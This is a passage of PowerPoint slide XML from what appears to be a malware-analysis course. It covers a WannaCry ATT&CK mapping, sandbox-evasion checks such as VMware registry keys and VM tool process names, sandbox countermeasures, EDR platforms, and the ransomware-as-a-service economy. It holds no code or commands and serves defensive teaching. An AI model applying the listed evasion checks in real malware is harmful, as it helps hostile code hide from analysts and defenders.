                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Pass-the-Hash (T1550.002), Remote Services (T1021)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304999">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Exfiltration</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0010</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Stealing data</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Exfiltration Over C2 Channel (T1041), DNS Tunneling (T1048.003)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305004">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Impact</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0040</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Executing final payload</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Data Encrypted for Impact (T1486), System Shutdown (T1529)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">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Framework for Malware Analysis (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_mitre_attack_navigator.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="2638838"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="400883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MITRE ATT&amp;CK Navigator heatmap for WannaCry, mapping each observed technique to the framework's tactic columns reveals the complete attack pattern and guides detection rule prioritization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Sandbox Evasion Techniques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Sandbox evasion</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> refers to techniques that malware uses to detect when it is executing inside a dynamic analysis sandbox and suppress its malicious behavior, appearing benign to automated analysis systems while remaining fully functional when deployed against real targets.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="5192677" cy="28412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Environmental Detection Checks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>
            <a:ext cx="5072677" cy="23912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VM Artifact Detection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Checking for VM-specific registry keys (</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>HKLM\SOFTWARE\VMware, Inc.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>), process names (</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>vmtoolsd.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>vboxservice.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>), driver names, and hardware fingerprints (VMware-prefixed MAC addresses).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Timing Analysis:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Measuring elapsed time using high-resolution counters, sandboxes that accelerate time to observe malware faster will show anomalously short execution times.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>User Interaction Detection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Checking mouse cursor movement delta, automated sandboxes typically show static cursor positions; real users produce continuous movement events.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>
            <a:ext cx="5192677" cy="284122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Analysis Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>
            <a:ext cx="5072677" cy="239122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Bare-Metal Sandboxes:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Run analysis on real physical hardware without hypervisors, eliminating VM artifact checks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cursor Simulation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Sandbox frameworks (Cuckoo) simulate mouse movement and keyboard events to defeat interaction checks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Network Connectivity:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Allow limited real internet access to prevent connectivity absence detection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Extended Execution Time:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Run samples for 10+ minutes rather than 2–5 to detect time-delayed payloads.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Human Interaction Simulation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Automatically scroll documents, click UI elements, and simulate typical user workflows.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Sandbox Evasion Techniques (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_sandbox_evasion_flowchart.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1497627" y="1330000"/>
            <a:ext cx="812121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Malware sandbox evasion decision tree, modern malware performs multiple environmental checks before executing its payload, making naive sandbox analysis produce false-negative results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Endpoint Detection &amp; Response (EDR) Tools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Endpoint Detection and Response (EDR)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> platforms provide continuous, kernel-level behavioral monitoring of endpoint activity, capturing process trees, file operations, network connections, registry changes, and memory events, enabling real-time detection, investigation, and automated response to malware that bypasses signature-based controls.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="5192677" cy="320504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EDR Core Capabilities</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>
            <a:ext cx="5072677" cy="27550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Kernel Sensor:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> A lightweight driver installed in the OS kernel streams all process, file, network, and registry events to a local analysis engine and cloud telemetry pipeline.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Behavioral Detection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Detects malware by matching activity patterns (e.g., a Word process spawning PowerShell, which then makes outbound HTTPS connections) rather than file hashes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Threat Hunting:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Allows SOC analysts to query historical telemetry data across all endpoints using a SQL-like interface (e.g., "show all processes that injected into lsass.exe in the last 30 days").</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Automated Response:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Isolates infected endpoints from the network, terminates malicious processes, and rolls back file changes, all without requiring analyst intervention.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>
            <a:ext cx="5192677" cy="320505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Leading EDR Platforms</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>
            <a:ext cx="5072677" cy="27550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CrowdStrike Falcon:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Cloud-native, lightweight kernel sensor; Adversary Intelligence integration; Real Time Response shell.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Microsoft Defender for Endpoint (MDE):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Deeply integrated with Windows OS telemetry; M365 Defender XDR integration.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SentinelOne Singularity:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> AI-powered behavioral engine; autonomous rollback of ransomware using VSS snapshots; storyline visualization.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Palo Alto Cortex XDR:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Multi-source data correlation (endpoint, network, cloud); stitches alert chains across data sources.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Endpoint Detection &amp; Response (EDR) Tools (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_edr_detection_architecture.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="747977" y="1330000"/>
            <a:ext cx="962051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EDR architecture, the kernel sensor captures raw OS events before malware can modify them, streaming behavioral telemetry for both real-time automated detection and retrospective threat hunting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Ransomware-as-a-Service (RaaS) Economy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Ransomware-as-a-Service (RaaS)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a criminal business model in which malware developers lease their ransomware platform, including the encryption engine, payment portal, victim negotiation services, and C2 infrastructure, to affiliate operators who conduct attacks and share a percentage of ransom proceeds with the developer.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Pentagon 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2037619"/>
            <a:ext cx="1379336"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RaaS Developer: Build ransomware platform, C2, payment portal, leak site</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Chevron 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1809892" y="2037619"/>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Publish affiliate recruitment on darknet forums</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Chevron 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3339228" y="2037619"/>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Affiliate applies and is vetted; receives access credentials and build customization options</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Chevron 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4868564" y="2037619"/>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Affiliate conducts targeting, phishing campaigns, initial access</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Chevron 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6397900" y="2037619"/>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Affiliate deploys ransomware on victim network after dwell time</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Chevron 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7927236" y="2037619"/>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Victim pays ransom in cryptocurrency (typically Monero or Bitcoin)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Chevron 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9456572" y="2037619"/>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Payment automatically split: 70–80% to affiliate, 20–30% to developer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Ransomware-as-a-Service (RaaS) Economy (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_raas_criminal_economy.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1086243" y="1330000"/>
            <a:ext cx="894398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RaaS criminal economy, operating as a franchise model with developer platforms, affiliate operators, and automated payment processing, lowering the barrier for ransomware attacks to criminal actors without malware development skills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Adware, PUPs &amp; Grayware, The Gray Zone</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Adware</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Potentially Unwanted Programs (PUPs)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>grayware</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> occupy the spectrum between clearly malicious malware and fully legitimate software, they often have some disclosed functionality but engage in undisclosed behaviors that compromise privacy or system performance, and they frequently serve as initial infection vectors for more serious malware.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="280556" y="2298512"/>
          <a:ext cx="10555354" cy="2257879"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638840"/>
              </a:tblGrid>
              <a:tr h="451575">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Category</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Definition</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Example Behaviors</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Example Specimens</a:t>
